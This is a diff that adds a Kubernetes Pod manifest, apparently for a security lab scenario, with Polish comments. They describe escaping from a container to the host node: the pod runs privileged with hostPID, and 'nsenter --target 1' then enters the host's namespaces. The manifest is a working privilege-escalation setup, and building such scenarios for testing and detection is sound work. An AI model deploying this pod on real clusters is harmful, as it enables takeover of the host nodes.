@@ -1,0 +1,25 @@
+# Scenariusz 1: pod uprzywilejowany jako punkt wyjścia do ucieczki na węzeł (T1610).
+# Zakłada, że atakujący ma prawo `create pods` w namespace (tu: dev) — np. po RCE
+# w aplikacji CI albo z wykradzionego, zbyt szerokiego konta. Minimalny, ale realny
+# zestaw uprawnień wystarczający do przejęcia hosta:
+#   privileged: true  -> pełne capabilities, dostęp do urządzeń i systemu plików hosta
+#   hostPID: true     -> wspólna przestrzeń PID z hostem, widać proces init (PID 1)
+# Mając jedno i drugie, `nsenter --target 1` wchodzi w przestrzenie nazw hosta.
+# Scheduler stawia poda na węźle-agencie (tam lądują pody scenariuszy) — atakujący
+# nie wybiera węzła; ucieczka działa na dowolnym węźle, na który pod trafi.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  labels:
+    app: privesc
+    krycy-scenario: "01-privileged-escape"
+spec:
+  hostPID: true
+  containers:
+    - name: tool
+      image: busybox:1.37
+      command: ["sleep", "infinity"]
+      securityContext:
+        privileged: true
+  restartPolicy: Never
